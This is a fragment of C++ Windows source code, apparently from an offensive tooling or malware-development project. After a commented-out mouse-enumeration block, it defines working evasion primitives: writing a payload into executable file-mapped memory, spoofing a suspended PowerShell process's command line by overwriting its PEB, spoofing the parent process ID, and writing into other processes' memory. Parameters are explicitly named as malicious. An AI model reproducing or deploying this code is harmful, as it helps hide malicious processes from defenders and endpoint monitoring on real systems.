		if (WindowProc(GetConsoleWindow(), WM_MBUTTONDBLCLK, GET_RAWINPUT_CODE_WPARAM(MK_LBUTTON | MK_CONTROL | MK_MBUTTON | MK_RBUTTON),
			reinterpret_cast<LPARAM>(&uiDeviceDataSize)) == uiDeviceDataSize) printf("Some Bullshit\n");
	}

	//pNtQuerySystemInfo = reinterpret_cast<fnNtQuerySystemInformation>(GetProcessAddressReplacement(GetModuleHandleReplacement(L"ntdll.dll"), const_cast<LPSTR>("NtQuerySystemInformation")));
	if (GET_RAWINPUT_CODE_WPARAM(1, pRawMouse) == 0 ) printf("%p\n",pRawMouse);

	phMiceHandleArray = FetchMouseHandle(&wAmountOfMice);

	if (phMiceHandleArray == nullptr || wAmountOfMice == NULL) return FALSE;

	pRawMouse = static_cast<HRAWINPUT>(LocalAlloc(LPTR, wAmountOfMice * sizeof(HRAWINPUT)));

	if (pMouseData_t_arr == nullptr) return FALSE;



	for (WORD i = 0; i < wAmountOfMice; i++)
	{



		pMouseData_t_arr[i] = static_cast<PRID_DEVICE_INFO>(LocalAlloc(LPTR, uiDeviceDataSize));

		if (pMouseData_t_arr[i] == nullptr) return FALSE;

		if (GetRawInputDeviceInfoA(phMiceHandleArray[i], RIDI_DEVICEINFO, pMouseData_t_arr[i], &uiDeviceDataSize) <= 0)
		{

			printf("[!] Failed to Retrieve Mouse Data!\n[i] ErrorCode: %lx", GetLastError());

			return FALSE;
		}
		if (pMouseData_t_arr[i]->dwType == RIM_TYPEMOUSE)
		{
			printf("[!] This is a Mouse!\n");


			if (pRawMouse == nullptr)
			{
				printf("[i] Device Type: %lu hz\n[i] Number Of Buttons: %lu\n", pMouseData_t_arr[i]->mouse.dwNumberOfButtons, 0);

				printf("[i] Found The Logitech Mouse!\n");
				break;
			}
			//else printf("[x] This Was 0x%.8lx\n", *pRawMouse);
		}
	}
	*/
}

BOOLEAN MapLocalMemory
(
	IN     PUCHAR  pPayload,
	   OUT PUCHAR *pMappedAddress,
	IN     SIZE_T  sPayloadSize,
	   OUT PHANDLE phFileMappingHandle 
)
{
	if (!phFileMappingHandle) return FALSE;
	
	BOOLEAN bState			= FALSE;
	HANDLE  hFile			= INVALID_HANDLE_VALUE;
	PUCHAR  pMappingAddress = nullptr;

	hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, nullptr, PAGE_EXECUTE_READWRITE, NULL, static_cast<DWORD>(sPayloadSize), nullptr);

	if (hFile == nullptr)
	{
		return bState;
	}
	pMappingAddress = static_cast<PUCHAR>(MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, sPayloadSize));

	if (pMappingAddress == nullptr)
	{
		CloseHandle(hFile);

		return bState;
	}
	memcpy_s(pMappingAddress, sPayloadSize, pPayload, sPayloadSize);

	bState = TRUE;

	*phFileMappingHandle = hFile;

	*pMappedAddress = pMappingAddress;

	return bState;
}


BOOLEAN ReadStructureFromProcess
(
	IN     HANDLE hTargetProcess, 
	IN     PVOID  pPEBBaseAddress, 
	   OUT PVOID *pReadBufferAddress, 
	IN     DWORD  dwBufferSize,
	IN     HANDLE hHeap
)
{
	if (!hTargetProcess || !pPEBBaseAddress ||  !dwBufferSize || !pReadBufferAddress) return FALSE;

	if (*pReadBufferAddress)
	{
		*pReadBufferAddress = nullptr;
	}

	SIZE_T	sBytesRead = 0;

	*pReadBufferAddress = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwBufferSize);

	if (!ReadProcessMemory(hTargetProcess, pPEBBaseAddress, *pReadBufferAddress, dwBufferSize, &sBytesRead) || sBytesRead != dwBufferSize) return FALSE;

	return TRUE;
}

LPWIN32_FIND_DATA_ARRAYW RefetchFilesArrayW
(
	IN     LPWSTR pPath,
	   OUT LPWIN32_FIND_DATA_ARRAYW pFiles_arr_t 
)
{
	FreeFileArray(pFiles_arr_t);
	return FetchFileArrayW(pPath);
}

BOOLEAN SpoofCommandLineArguments
(
	IN     LPWSTR  pSpoofedCommandLine,
	IN	   LPWSTR  pMaliciousCommandLine,
	IN     DWORD   dwSpoofedCLALength,
	   OUT PHANDLE phProcessHandle,
	   OUT PDWORD  pdwProcessId,
	   OUT PHANDLE phThreadHandle,
	   OUT PDWORD  pdwThreadId
)
{
	if (!pSpoofedCommandLine || !pMaliciousCommandLine || !dwSpoofedCLALength || !phProcessHandle 
	  ||!pdwProcessId		 || !phThreadHandle		   || !pdwThreadId			   ) return FALSE;

	BOOLEAN						  bState				  = FALSE;
	PPEB						  pProcEnvBlock_t		  = nullptr;
	fnNTQueryProcessInformation   NtQueryProcInfo		  = nullptr;
	PRTL_USER_PROCESS_PARAMETERS  pProcessUserParameters  = nullptr;
	ULONG						  ulRetren				  =   0;
	NTSTATUS					  NtStatus				  =   0;
	WCHAR						  pProcess[MAX_PATH]	  = { 0 };
	STARTUPINFOW				  StartupInfo_t			  = { 0 };
	PROCESS_INFORMATION			  ProcessInformation_t    = {   };
	PROCESS_BASIC_INFORMATION	  ProcessBasicInfoBlock_t = {   };
	HANDLE						  hHeap					  = GetProcessHeap();
	DWORD						  dwExposedLength = sizeof(L"powershell.exe");

	if ((NtQueryProcInfo = (fnNTQueryProcessInformation)GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtQueryInformationProcess")) == nullptr) return FALSE;

	StartupInfo_t.cb = sizeof(STARTUPINFOW);

	lstrcpyW(pProcess, pSpoofedCommandLine);

	if (!CreateProcessW(nullptr, pProcess,nullptr, nullptr,FALSE,CREATE_SUSPENDED | CREATE_NO_WINDOW,nullptr,L"C:\\Windows\\System32\\", &StartupInfo_t, &ProcessInformation_t)) return FALSE;

	if ((NtStatus = NtQueryProcInfo(ProcessInformation_t.hProcess, ProcessBasicInformation, &ProcessBasicInfoBlock_t, sizeof(PROCESS_BASIC_INFORMATION), &ulRetren)) != 0) return FALSE;

	pProcEnvBlock_t = static_cast<PPEB>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PEB)));

	if (!ReadStructureFromProcess(ProcessInformation_t.hProcess, ProcessBasicInfoBlock_t.PebBaseAddress, reinterpret_cast<PVOID*>(&pProcEnvBlock_t), sizeof(PEB), hHeap)) goto EndOfFunc;
	 
	if (!ReadStructureFromProcess(ProcessInformation_t.hProcess, pProcEnvBlock_t->ProcessParameters, reinterpret_cast<PVOID *>(&pProcessUserParameters), sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF,hHeap )) goto EndOfFunc;

	if (!WriteToTargetProcessEnvironmentBlock(ProcessInformation_t.hProcess, pProcessUserParameters->CommandLine.Buffer, pMaliciousCommandLine, static_cast<DWORD>(lstrlenW(pMaliciousCommandLine) * sizeof(WCHAR) + 1))) goto EndOfFunc;
	
	if (!WriteToTargetProcessEnvironmentBlock(ProcessInformation_t.hProcess, pProcEnvBlock_t->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length),&dwExposedLength, sizeof(DWORD))) goto EndOfFunc;

	*pdwProcessId    = ProcessInformation_t.dwProcessId;
	*phProcessHandle = ProcessInformation_t.hProcess;
	*pdwThreadId     = ProcessInformation_t.dwThreadId;
	*phThreadHandle  = ProcessInformation_t.hThread;

	if (!*pdwProcessId || !*phProcessHandle || !*pdwThreadId || !*phThreadHandle) return FALSE;
	bState = TRUE;


EndOfFunc:
	if (pProcEnvBlock_t) HeapFree(hHeap, 0, pProcEnvBlock_t);
	if (pProcessUserParameters)HeapFree(hHeap, 0, pProcessUserParameters);

	return bState;
}

BOOLEAN SpoofParentProcessId
(
	IN     LPSTR   pMaliciousProcessName, 
	IN     HANDLE  hSpoofedParentProcessHandle, //a HANDLE is a datatype used by the WinAPI to handle i.e. Interact with objects (files, processes, threads, consoles, windows, etc..)
	   OUT PDWORD  pdwMaliciousProcessPID,
	   OUT PHANDLE phMaliciousProcessHandle,
	   OUT PDWORD  pdwMaliciousThreadId,
	   OUT PHANDLE phMaliciousThreadHandle
)
{
	if (!pMaliciousProcessName	  || !hSpoofedParentProcessHandle || !pdwMaliciousProcessPID 
	 || !phMaliciousProcessHandle || !pdwMaliciousThreadId		  || !phMaliciousThreadHandle) return FALSE;

	SIZE_T						sThreadAttributeListSize = 0;
	PPROC_THREAD_ATTRIBUTE_LIST pThreadsAttributeList_t  = nullptr;
	STARTUPINFOEXA				StartupInfoEx_t			 = { };
	HANDLE						hHeap					 = GetProcessHeap();
	PROCESS_INFORMATION         ProcessInformation_t	 = { 0 };
	BOOLEAN						bState					 = FALSE;
	CHAR						lpPath[MAX_PATH]		 = { 0x00 },
								WnDr[MAX_PATH]			 = { 0x00 };

	StartupInfoEx_t.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	InitializeProcThreadAttributeList(nullptr, 1, NULL, &sThreadAttributeListSize);

	if ((pThreadsAttributeList_t = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sThreadAttributeListSize)) == nullptr) return FALSE;

	if (!GetEnvironmentVariableA("WinDir", WnDr, MAX_PATH)) goto EndOfFunc;

	if (sprintf_s(lpPath, MAX_PATH,"%s\\System32\\%s", WnDr, pMaliciousProcessName) == 1) goto EndOfFunc;

	if (!InitializeProcThreadAttributeList(pThreadsAttributeList_t, 1, NULL, &sThreadAttributeListSize)) return FALSE;

	if (!UpdateProcThreadAttribute(pThreadsAttributeList_t, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hSpoofedParentProcessHandle, sizeof(HANDLE), nullptr, nullptr)) goto EndOfFunc;

	StartupInfoEx_t.lpAttributeList = pThreadsAttributeList_t;

	if (!CreateProcessA(
		lpPath, nullptr,
		nullptr, nullptr,
		FALSE, CREATE_SUSPENDED |  EXTENDED_STARTUPINFO_PRESENT,
		nullptr, "C:\\Windows\\System32",
		&StartupInfoEx_t.StartupInfo, &ProcessInformation_t)) goto EndOfFunc;

	if (!ProcessInformation_t.dwProcessId || !ProcessInformation_t.hProcess || !ProcessInformation_t.dwThreadId || !ProcessInformation_t.hThread) goto EndOfFunc; 

	*pdwMaliciousProcessPID   = ProcessInformation_t.dwProcessId;
	*phMaliciousProcessHandle = ProcessInformation_t.hProcess;
	*pdwMaliciousThreadId     = ProcessInformation_t.dwThreadId;
	*phMaliciousThreadHandle  = ProcessInformation_t.hThread;
	bState = TRUE;

EndOfFunc:
	HeapFree(hHeap, 0, pThreadsAttributeList_t);

	return bState;
}

BOOLEAN SpoofProcessCLA_PPID //CLA = Command Line Argument | PPID = Parent Process Identifier
(
	IN	    LPWSTR  pSpoofedCommandLine,
	IN      HANDLE  hSpoofedParentProcessHandle,
	IN      LPWSTR  pMaliciousCommandLine,
	IN      DWORD   dwExposedCommandLineLength,
	IN      PCH     pTargetSpoofedPathName,
	   OUT 	PHANDLE phMaliciousProcessHandle,
	   OUT  PDWORD  pdwMaliciousProcessId,
	   OUT	PHANDLE phMalicousThreadHandle,
	   OUT  PDWORD  pdwMaliciousThreadId 
)
{
	if (!pSpoofedCommandLine	  || !hSpoofedParentProcessHandle || !pMaliciousCommandLine  || !dwExposedCommandLineLength ||
		!phMaliciousProcessHandle || !pdwMaliciousProcessId       || !phMalicousThreadHandle || !pdwMaliciousThreadId		  ) return FALSE;

	WCHAR						 pSpoofedProcessPath[MAX_PATH]  = { 0x0000 },
								 pProcess[MAX_PATH]			    = { 0x0000 },
								 pSpoofedSubDirectory[MAX_PATH] = { 0x0000 };

	DWORD						 dwNewLen						= sizeof(L"powershell.exe");
	HANDLE						 hHeap							= GetProcessHeap();
	BOOLEAN						 bState							= FALSE;
	ULONG						 ulRetren						= 0;
	SIZE_T						 sThreadAttributeListSize		= 0,
								 sConvertedBytes				= 0,
								 Index							= 0;
	NTSTATUS					 ntStatus						= 0;
	STARTUPINFOEXW				 StartupInfoEx_t				= {   };
	PROCESS_INFORMATION          ProcessInformation_t			= {   };
	PROCESS_BASIC_INFORMATION	 ProcessBasicInfoBlock_t		= {   };
	PPEB						 pProcEnvBlock_t				= nullptr;
	LPPROC_THREAD_ATTRIBUTE_LIST pThreadsAttributeList_t		= nullptr;
	fnNTQueryProcessInformation  NtQueryProcInfo				= nullptr;
	PRTL_USER_PROCESS_PARAMETERS pProcessUserParameters			= nullptr;

	StartupInfoEx_t.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	if ((NtQueryProcInfo = reinterpret_cast<fnNTQueryProcessInformation>(GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtQueryInformationProcess"))) == nullptr) return FALSE;

	InitializeProcThreadAttributeList(nullptr, 1, 0, &sThreadAttributeListSize);
	
	if ((pThreadsAttributeList_t = static_cast<PPROC_THREAD_ATTRIBUTE_LIST>(HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sThreadAttributeListSize))) == nullptr) return FALSE;

	if (!InitializeProcThreadAttributeList(pThreadsAttributeList_t, 1, 0, &sThreadAttributeListSize)) goto EndOfFunc;

	if (!GetEnvironmentVariableW(L"WinDir", pSpoofedProcessPath, MAX_PATH * sizeof(WCHAR))) goto EndOfFunc;

	if (!UpdateProcThreadAttribute(pThreadsAttributeList_t, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, (PVOID)&hSpoofedParentProcessHandle, sizeof(HANDLE), nullptr, nullptr)) goto EndOfFunc;

	StartupInfoEx_t.lpAttributeList = pThreadsAttributeList_t;

	pSpoofedProcessPath[lstrlenW(pSpoofedProcessPath)] = 0x5C; // L'\\'

	if (mbstowcs_s(&sConvertedBytes, pSpoofedSubDirectory, MAX_PATH, pTargetSpoofedPathName, MAX_PATH) || sConvertedBytes != 1 + strlen(pTargetSpoofedPathName)) goto EndOfFunc;

	pSpoofedSubDirectory[0] = towupper(pSpoofedSubDirectory[0]);

	wcscat_s(pSpoofedProcessPath, MAX_PATH, pSpoofedSubDirectory);

	Index = lstrlenW(pSpoofedProcessPath);
	
	pSpoofedProcessPath[Index] = 0x5C; // L'\\'

	pSpoofedProcessPath[Index + 1] = 0x00;

	if (!CreateProcessW(L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", pSpoofedCommandLine, nullptr, nullptr, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, nullptr, pSpoofedProcessPath, &StartupInfoEx_t.StartupInfo, &ProcessInformation_t)) 
	{
		printf("CreateProcessW Failed With Error: 0x%lx", GetLastError());
		goto EndOfFunc;
	}

	if ((ntStatus = NtQueryProcInfo(ProcessInformation_t.hProcess, ProcessBasicInformation, &ProcessBasicInfoBlock_t, sizeof(PROCESS_BASIC_INFORMATION), &ulRetren)) != 0) return FALSE;

	pProcEnvBlock_t = static_cast<PPEB>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PEB)));

	if (!ReadStructureFromProcess(ProcessInformation_t.hProcess, ProcessBasicInfoBlock_t.PebBaseAddress, reinterpret_cast<PVOID*>(&pProcEnvBlock_t),sizeof(PEB), hHeap)) goto EndOfFunc;

	if (!ReadStructureFromProcess(ProcessInformation_t.hProcess,pProcEnvBlock_t->ProcessParameters, reinterpret_cast<PVOID *>(&pProcessUserParameters),sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF, hHeap)) goto EndOfFunc;

	if (!WriteToTargetProcessEnvironmentBlock(ProcessInformation_t.hProcess, pProcessUserParameters->CommandLine.Buffer, pMaliciousCommandLine, static_cast<DWORD>(lstrlenW(pMaliciousCommandLine) * sizeof(WCHAR) + 1)))  goto EndOfFunc; 

	if (!WriteToTargetProcessEnvironmentBlock(ProcessInformation_t.hProcess, (reinterpret_cast<PBYTE>(pProcEnvBlock_t->ProcessParameters ) + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length)), &dwNewLen, sizeof(DWORD))) goto EndOfFunc;

	if (!ProcessInformation_t.dwProcessId || !ProcessInformation_t.dwThreadId|| !ProcessInformation_t.hProcess|| !ProcessInformation_t.hThread) goto EndOfFunc;

	*phMalicousThreadHandle   = ProcessInformation_t.hThread;
	*pdwMaliciousThreadId     = ProcessInformation_t.dwThreadId;
	*phMaliciousProcessHandle = ProcessInformation_t.hProcess;
	*pdwMaliciousProcessId    = ProcessInformation_t.dwProcessId;

	bState = TRUE;

EndOfFunc:

	if (pThreadsAttributeList_t) DeleteProcThreadAttributeList(pThreadsAttributeList_t);

	if (pProcEnvBlock_t) HeapFree(hHeap, 0, pProcEnvBlock_t);

	if (pProcessUserParameters) HeapFree(hHeap, 0, pProcessUserParameters);

	return bState;
}

VOID TestAlertableThread
(
	IN     HANDLE hAlertableThreadHandle
)
{
	for (unsigned short i = 0; i < 1000; i++)
	{
		if (!QueueUserAPC((PAPCFUNC)AlertableFunction1, hAlertableThreadHandle, i)) break;
		SleepEx(120, TRUE);
	}
}


BOOLEAN WriteToTargetProcessEnvironmentBlock
(
	IN      HANDLE hProcess,
	IN      PVOID  pAddressToWriteTo,
	IN      PVOID  pBuffer,
	IN      DWORD  dwBufferSize
)
{
	if (!hProcess || !pAddressToWriteTo || !pBuffer || !dwBufferSize) return FALSE;

	SIZE_T sBytesWritten = 0;

	if (!WriteProcessMemory(hProcess, pAddressToWriteTo, pBuffer, dwBufferSize, &sBytesWritten) || sBytesWritten != dwBufferSize) return FALSE;

	return TRUE;
}